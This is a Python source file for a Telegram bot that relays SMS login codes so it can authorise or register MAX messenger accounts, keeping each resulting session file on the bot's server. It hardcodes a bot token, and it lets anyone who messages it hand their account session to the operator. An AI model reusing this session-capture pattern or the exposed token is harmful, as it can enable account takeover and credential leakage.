import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message
from pymax import Client, ExtraConfig

BOT_TOKEN = "8983059538:AAF1XQEkuwmvYreLN2csBfYrRW8NBQ9pwuc"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
pending = {}

class TelegramSmsProvider:
    def __init__(self):
        self._queue = asyncio.Queue()

    async def set_code(self, code: str):
        await self._queue.put(code)

    async def get_code(self, phone: str) -> str:
        return await self._queue.get()

@dp.message(Command("start"))
async def start_cmd(msg: Message):
    await msg.answer(
        "Привет! Отправь номер в формате +79161234567\n"
        "Я запрошу SMS и авторизую аккаунт."
    )

@dp.message(F.text, ~F.text.startswith("/"))
async def phone_handler(msg: Message):
    phone = msg.text.strip()
    if not phone.startswith("+") or len(phone) != 12:
        return await msg.answer("❌ Формат: +79161234567")

    sms_provider = TelegramSmsProvider()
    client = Client(
        phone=phone,
        work_dir="cache",
        session_name=f"{phone}.db",
        sms_code_provider=sms_provider,
        registration=True,
        extra_config=ExtraConfig(log_level="INFO"),
    )

    asyncio.create_task(run_client(msg, client, phone, sms_provider))
    await msg.answer(f"⏳ Запрашиваю SMS на {phone}... Жду код.")

async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
    try:
        pending[msg.from_user.id] = sms_provider
        await client.start()
        await msg.answer(f"✅ {phone} авторизован!\nСессия: cache/{phone}.db")
    except Exception as e:
        await msg.answer(f"❌ Ошибка: {type(e).__name__}: {e}")
    finally:
        pending.pop(msg.from_user.id, None)

@dp.message(Command("code"))
async def code_handler(msg: Message):
    if msg.from_user.id not in pending:
        return await msg.answer("❌ Сначала отправь номер")

    code = msg.text.split()[1] if len(msg.text.split()) > 1 else None
    if not code or not code.isdigit():
        return await msg.answer("❌ Используй: /code 12345")

    provider = pending[msg.from_user.id]
    await provider.set_code(code)
    await msg.answer("✅ Код принят, авторизую...")

async def main():
    print("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
